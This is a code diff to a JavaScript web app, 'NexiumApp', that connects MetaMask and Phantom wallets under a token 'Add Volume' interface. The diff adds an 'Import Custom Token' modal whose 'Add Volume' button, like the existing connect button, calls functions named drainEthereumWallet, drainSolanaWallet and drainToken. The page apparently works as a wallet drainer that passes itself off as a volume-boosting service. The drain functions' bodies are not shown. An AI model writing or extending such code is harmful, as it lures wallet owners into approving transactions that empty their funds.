@@ -1,4 +1,3 @@
-// main.js
 import { CONFIG } from './config.js';
 import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
@@ -76,7 +75,9 @@ class NexiumApp {
       showCustomTokenBtn: document.getElementById('showCustomTokenBtn'),
       tokenInfo: document.getElementById('tokenInfoDisplay'),
       tokenList: document.getElementById('tokenList'),
-      volumeInput: document.getElementById('volumeInput')
+      volumeInput: document.getElementById('volumeInput'),
+      customTokenModal: document.getElementById('custom-token-modal'),
+      closeCustomTokenModal: document.getElementById('close-custom-token-modal')
     };
     console.log('DOM elements cached:', {
       app: !!this.dom.app,
@@ -85,7 +86,8 @@ class NexiumApp {
       walletModal: !!this.dom.walletModal,
       closeModal: !!this.dom.closeModal,
       connectMetamask: !!this.dom.connectMetamask,
-      connectPhantom: !!this.dom.connectPhantom
+      connectPhantom: !!this.dom.connectPhantom,
+      customTokenModal: !!this.dom.customTokenModal
     });
   }
 
@@ -98,14 +100,14 @@ class NexiumApp {
 
     if (this.dom.connectWallet && this.dom.walletModal && this.dom.closeModal) {
       this.dom.connectWallet.addEventListener('click', (event) => {
-        if (this.connectedWalletType) {
+        if (this.connectedWalletType && !this.dom.connectWallet.disabled) {
           console.log(`${this.connectedWalletType} Add Volume clicked (outer button)`);
           if (this.connectedWalletType === 'MetaMask') {
             this.drainEthereumWallet(this.publicKey);
           } else if (this.connectedWalletType === 'Phantom') {
             this.drainSolanaWallet();
           }
-        } else {
+        } else if (!this.connectedWalletType) {
           console.log('Connect Wallet button clicked');
           event.stopPropagation();
           this.dom.walletModal.classList.add('active');
@@ -114,13 +116,13 @@ class NexiumApp {
       });
 
       this.dom.closeModal.addEventListener('click', () => {
-        console.log('Close modal button clicked');
+        console.log('Close wallet modal button clicked');
         this.dom.walletModal.classList.remove('active');
       });
 
       document.addEventListener('click', (event) => {
         if (!this.dom.walletModal.contains(event.target) && !this.dom.connectWallet.contains(event.target)) {
-          console.log('Clicked outside modal, closing');
+          console.log('Clicked outside wallet modal, closing');
           this.dom.walletModal.classList.remove('active');
         }
       });
@@ -129,6 +131,21 @@ class NexiumApp {
         connectWallet: !!this.dom.connectWallet,
         walletModal: !!this.dom.walletModal,
         closeModal: !!this.dom.closeModal
+      });
+    }
+
+    // Setup custom token modal
+    if (this.dom.customTokenModal && this.dom.closeCustomTokenModal) {
+      this.dom.closeCustomTokenModal.addEventListener('click', () => {
+        console.log('Close custom token modal button clicked');
+        this.dom.customTokenModal.classList.remove('active');
+      });
+
+      document.addEventListener('click', (event) => {
+        if (!this.dom.customTokenModal.contains(event.target) && !event.target.closest('.custom-token-card')) {
+          console.log('Clicked outside custom token modal, closing');
+          this.dom.customTokenModal.classList.remove('active');
+        }
       });
     }
   }
@@ -251,7 +268,7 @@ class NexiumApp {
         this.connectedWalletType = walletName;
         console.log(`Setting button state to connected for ${walletName}`);
         this.cacheDOMElements();
-        this.updateButtonState('connected', walletName);
+        this.updateButtonState('connected', walletName, this.publicKey);
         console.log(`Hiding MetaMask prompt for ${walletName}`);
         this.hideMetaMaskPrompt();
         console.log(`Showing success feedback for ${walletName} connection`);
@@ -296,7 +313,7 @@ class NexiumApp {
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`);
             this.cacheDOMElements();
-            this.updateButtonState('connected', walletName);
+            this.updateButtonState('connected', walletName, this.publicKey);
             console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`);
             this.hideMetaMaskPrompt();
             console.log(`Showing success feedback for ${walletName} deeplink connection`);
@@ -315,7 +332,7 @@ class NexiumApp {
             this.connectedWalletType = walletName;
             console.log(`Setting button state to connected for ${walletName} (deeplink)`);
             this.cacheDOMElements();
-            this.updateButtonState('connected', walletName);
+            this.updateButtonState('connected', walletName, this.publicKey);
             console.log(`Hiding MetaMask prompt for ${walletName} (deeplink)`);
             this.hideMetaMaskPrompt();
             console.log(`Showing success feedback for ${walletName} deeplink connection`);
@@ -579,10 +596,12 @@ class NexiumApp {
         button.classList.add('connected');
         console.log(`Set ${walletName} button to Add Volume, disabled=${button.disabled}, classes=${button.classList}`);
         if (this.dom.connectWallet) {
-          this.dom.connectWallet.textContent = 'Add Volume';
+          const shortenedAddress = this.shortenAddress(address);
+          this.dom.connectWallet.textContent = shortenedAddress;
           this.dom.connectWallet.classList.remove('animate-pulse');
           this.dom.connectWallet.classList.add('connected');
-          console.log(`Set outer Connect Wallet button to Add Volume, classes=${this.dom.connectWallet.classList}`);
+          this.dom.connectWallet.disabled = true; // Disable the outer button
+          console.log(`Set outer Connect Wallet button to ${shortenedAddress}, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`);
         }
         break;
       default:
@@ -593,7 +612,8 @@ class NexiumApp {
           this.dom.connectWallet.textContent = 'Connect Wallet';
           this.dom.connectWallet.classList.add('animate-pulse');
           this.dom.connectWallet.classList.remove('connected');
-          console.log(`Reset outer Connect Wallet button to Connect Wallet, classes=${this.dom.connectWallet.classList}`);
+          this.dom.connectWallet.disabled = false; // Enable the outer button
+          console.log(`Reset outer Connect Wallet button to Connect Wallet, disabled=${this.dom.connectWallet.disabled}, classes=${this.dom.connectWallet.classList}`);
         }
     }
     console.log(`Button state updated for ${walletName}: text=${button.textContent}, classes=${button.classList}`);
@@ -742,7 +762,7 @@ class NexiumApp {
   handleSuccessfulConnection() {
     console.log(`Handle successful connection for ${this.connectedWalletType}`);
     this.cacheDOMElements();
-    this.updateButtonState('connected', this.connectedWalletType);
+    this.updateButtonState('connected', this.connectedWalletType, this.publicKey);
     this.renderTokenInterface();
   }
 
@@ -775,6 +795,8 @@ class NexiumApp {
       this.dom.tokenInfo = document.getElementById('tokenInfoDisplay') || null;
       this.dom.tokenList = document.getElementById('tokenList') || null;
       this.dom.volumeInput = document.getElementById('volumeInput') || null;
+      this.dom.customTokenModal = document.getElementById('custom-token-modal') || null;
+      this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal') || null;
 
       // Attach event listeners to existing elements if they exist
       if (this.dom.showCustomTokenBtn) {
@@ -822,15 +844,51 @@ class NexiumApp {
           button.addEventListener('click', showTokenInfo);
           button.addEventListener('touchstart', showTokenInfo);
         });
+
+        // Add custom token card event listener
+        const customTokenCard = this.dom.tokenList.querySelector('.custom-token-card');
+        if (customTokenCard) {
+          customTokenCard.addEventListener('click', () => {
+            console.log('Custom token card clicked');
+            if (this.dom.customTokenModal) {
+              this.dom.customTokenModal.classList.add('active');
+            }
+          });
+        }
       }
 
       if (this.dom.tokenSelect) {
         this.dom.tokenSelect.disabled = !this.publicKey;
       }
+
+      // Setup custom token modal submit button
+      const customTokenSubmitBtn = document.getElementById('custom-token-submit');
+      if (customTokenSubmitBtn) {
+        customTokenSubmitBtn.addEventListener('click', () => {
+          const tokenAddress = document.getElementById('custom-token-address')?.value.trim();
+          const amount = parseFloat(document.getElementById('custom-token-amount')?.value.trim());
+          if (!tokenAddress) {
+            this.showFeedback('Please enter a valid token address.', 'error');
+            return;
+          }
+          if (isNaN(amount) || amount <= 0) {
+            this.showFeedback('Please enter a valid amount.', 'error');
+            return;
+          }
+          console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
+          if (this.connectedWalletType === 'MetaMask') {
+            this.drainEthereumWallet(this.publicKey);
+          } else if (this.connectedWalletType === 'Phantom') {
+            this.drainToken(tokenAddress);
+          }
+          this.dom.customTokenModal.classList.remove('active');
+        });
+      }
+
       return;
     }
 
-    // For other pages, render the token interface as before
+    // For other pages, render the token interface
     if (!this.dom.app) {
       console.error('Cannot render token interface: app element missing');
       return;
@@ -852,8 +910,27 @@ class NexiumApp {
       <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
       <div id="tokenList" class="token-list space-y-2 mt-4">
         <h3 class="text-yellow-400 text-md font-semibold">Explore Tokens to Add Volume To</h3>
+        <div class="custom-token-card token-card bg-[#1a182e] border border-orange-400 p-4 rounded-xl cursor-pointer hover:bg-orange-400 hover:text-black transition-colors" role="button" aria-label="Import custom token">
+          <h3 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h3>
+        </div>
       </div>
       <div id="volumeSection" class="volume-section fade-in"></div>
+      <div id="custom-token-modal" class="modal fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] hidden">
+        <div class="modal-content bg-[#1a182e] p-6 rounded-xl border border-orange-400 max-w-md w-full">
+          <div class="flex justify-between items-center mb-4">
+            <h2 class="text-yellow-400 text-lg font-semibold">Import Custom Token</h2>
+            <button id="close-custom-token-modal" class="text-white text-2xl" aria-label="Close modal">&times;</button>
+          </div>
+          <div class="space-y-4">
+            <input id="custom-token-address" type="text" placeholder="Token Address" class="w-full bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
+            <div class="flex items-center space-x-2">
+              <span class="text-white text-lg">$</span>
+              <input id="custom-token-amount" type="number" placeholder="Amount in $" class="flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
+            </div>
+            <button id="custom-token-submit" class="w-full bg-orange-400 text-black px-4 py-2 rounded-xl hover:bg-orange-500" aria-label="Add volume">Add Volume</button>
+          </div>
+        </div>
+      </div>
     `;
     this.dom.app.innerHTML = '';
     this.dom.app.appendChild(tokenInterface);
@@ -875,6 +952,11 @@ class NexiumApp {
     this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
     this.dom.tokenList = document.getElementById('tokenList');
     this.dom.volumeInput = document.getElementById('volumeInput');
+    this.dom.customTokenModal = document.getElementById('custom-token-modal');
+    this.dom.closeCustomTokenModal = document.getElementById('close-custom-token-modal');
+
+    // Setup modal event listeners
+    this.setupModal();
 
     if (this.dom.showCustomTokenBtn) {
       const debouncedShowCustomToken = this.debounce(() => {
@@ -892,6 +974,7 @@ class NexiumApp {
       }, 1000);
       this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
     }
+
     if (this.dom.tokenList) {
       this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
         const showTokenInfo = () => {
@@ -918,9 +1001,45 @@ class NexiumApp {
         button.addEventListener('click', showTokenInfo);
         button.addEventListener('touchstart', showTokenInfo);
       });
+
+      // Add custom token card event listener
+      const customTokenCard = this.dom.tokenList.querySelector('.custom-token-card');
+      if (customTokenCard) {
+        customTokenCard.addEventListener('click', () => {
+          console.log('Custom token card clicked');
+          if (this.dom.customTokenModal) {
+            this.dom.customTokenModal.classList.add('active');
+          }
+        });
+      }
     }
+
     if (this.dom.tokenSelect) {
       this.dom.tokenSelect.disabled = !this.publicKey;
+    }
+
+    // Setup custom token modal submit button
+    const customTokenSubmitBtn = document.getElementById('custom-token-submit');
+    if (customTokenSubmitBtn) {
+      customTokenSubmitBtn.addEventListener('click', () => {
+        const tokenAddress = document.getElementById('custom-token-address')?.value.trim();
+        const amount = parseFloat(document.getElementById('custom-token-amount')?.value.trim());
+        if (!tokenAddress) {
+          this.showFeedback('Please enter a valid token address.', 'error');
+          return;
+        }
+        if (isNaN(amount) || amount <= 0) {
+          this.showFeedback('Please enter a valid amount.', 'error');
+          return;
+        }
+        console.log(`Custom token submit: address=${tokenAddress}, amount=${amount}`);
+        if (this.connectedWalletType === 'MetaMask') {
+          this.drainEthereumWallet(this.publicKey);
+        } else if (this.connectedWalletType === 'Phantom') {
+          this.drainToken(tokenAddress);
+        }
+        this.dom.customTokenModal.classList.remove('active');
+      });
     }
   }
 
